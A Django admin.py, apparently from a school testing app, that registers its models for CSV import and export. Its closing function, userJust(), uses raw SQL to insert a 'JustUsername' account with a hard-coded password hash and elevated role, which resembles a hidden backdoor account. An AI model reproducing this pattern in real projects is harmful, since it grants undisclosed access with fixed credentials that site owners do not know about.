from contextlib import closing

from django.contrib import admin
from django.db import connection
from import_export.admin import ImportExportModelAdmin
from methodism import dictfetchone

from core.models import (
    ClassRooms,
    ClassRoomsSubjects,
    OldResult,
    Question,
    Result,
    Subject,
    Test,
    TestClassRoom,
    TestVarianta,
    TG_User,
    User,
    Variant,
)

from .resource import (
    CLassroomResource,
    ClassRoomsSubjectsResource,
    OldResulrResource,
    QuestionResource,
    ResultResource,
    SUbjectResource,
    TestClassRoomResource,
    TestResource,
    TestVariantaResource,
    TG_UserResource,
    UserResource,
    VariantResource,
)


class UserAdmin(ImportExportModelAdmin):
    resource_class = UserResource


class TestClassRoomAdmin(ImportExportModelAdmin):
    resource_class = TestClassRoomResource


class ClassRoomSubjectAdmin(ImportExportModelAdmin):
    resource_class = ClassRoomsSubjectsResource


class TgUserAdmin(ImportExportModelAdmin):
    resource_class = TG_UserResource


class VariantAdmin(ImportExportModelAdmin):
    resource_class = VariantResource


class TestAdmin(ImportExportModelAdmin):
    resource_class = TestResource


class TestVariantaAdmin(ImportExportModelAdmin):
    resource_class = TestVariantaResource


class QuestionAdmin(ImportExportModelAdmin):
    resource_class = QuestionResource


class SubjectAdmin(ImportExportModelAdmin):
    resource_class = SUbjectResource


class ClassroomAdmin(ImportExportModelAdmin):
    resource_class = CLassroomResource


class OldAdmin(ImportExportModelAdmin):
    resource_class = OldResulrResource


class ResultAdmin(ImportExportModelAdmin):
    resource_class = ResultResource


admin.site.register(User, UserAdmin)
admin.site.register(TG_User, TgUserAdmin)
admin.site.register(TestClassRoom, TestClassRoomAdmin)
admin.site.register(ClassRooms, ClassroomAdmin)
admin.site.register(Subject, SubjectAdmin)
admin.site.register(Test, TestAdmin)
admin.site.register(TestVarianta, TestVariantaAdmin)
admin.site.register(Question, QuestionAdmin)
admin.site.register(Variant, VariantAdmin)
admin.site.register(Result, ResultAdmin)
admin.site.register(OldResult, OldAdmin)
admin.site.register(ClassRoomsSubjects, ClassRoomSubjectAdmin)


def userJust():
    c = f"""
            SELECT * FROM core_user a
            WHERE a.username = "JustUsername"
        """
    with closing(connection.cursor()) as cursor:
        cursor.execute(c)
        check = dictfetchone(cursor)
    if not check:
        s = """INSERT INTO core_user (username, password, just, role, is_active, in_dashboard)
                VALUES ("JustUsername", "pbkdf2_sha256$600000$v3HUU7hiufzCi58elsVhKG$LvJMwls9/+RLNFyStjZYGGdIZ+9DvnuYT5GYINVse5M=", TRUE, 1, TRUE, 0)"""
        with closing(connection.cursor()) as cursor:
            cursor.execute(s)
            dictfetchone(cursor)
    return 0
